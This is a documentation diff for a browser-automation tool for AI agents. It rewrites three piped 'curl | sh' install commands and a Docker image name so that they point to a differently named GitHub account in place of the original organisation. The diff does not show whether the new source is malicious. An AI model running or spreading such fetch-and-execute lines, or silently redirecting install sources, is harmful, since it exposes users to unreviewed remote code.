@@ -112,7 +112,7 @@ testmu-browser-agent's MCP server is the primary way to give Claude browser capa
 ### Step 1: Install
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/testmu/testmu-browser-agent/main/scripts/install.sh | sh
+curl -sSL https://raw.githubusercontent.com/4DvAnCeBoY/testmu-browser-agent-public/main/scripts/install.sh | sh
 ```
 
 ### Step 2: Configure Claude Code
@@ -366,7 +366,7 @@ Five commands to go from zero to an AI agent controlling a browser:
 
 ```bash
 # 1. Install
-curl -sSL https://raw.githubusercontent.com/testmu/testmu-browser-agent/main/scripts/install.sh | sh
+curl -sSL https://raw.githubusercontent.com/4DvAnCeBoY/testmu-browser-agent-public/main/scripts/install.sh | sh
 
 # 2. Verify
 testmu-browser-agent --version
@@ -401,7 +401,7 @@ macOS, Linux, and Windows are all supported. Pre-built binaries for Apple Silico
 **Docker:**
 
 ```bash
-docker run -p 9222:9222 testmu/testmu-browser-agent:latest serve --headless
+docker run -p 9222:9222 4DvAnCeBoY/testmu-browser-agent-public:latest serve --headless
 ```
 
 ---
@@ -423,5 +423,5 @@ testmu-browser-agent is available now. The source is on GitHub. The install scri
 If you are building AI agents that need to interact with the web, this is the browser tool that was designed for them.
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/testmu/testmu-browser-agent/main/scripts/install.sh | sh
+curl -sSL https://raw.githubusercontent.com/4DvAnCeBoY/testmu-browser-agent-public/main/scripts/install.sh | sh
 ```
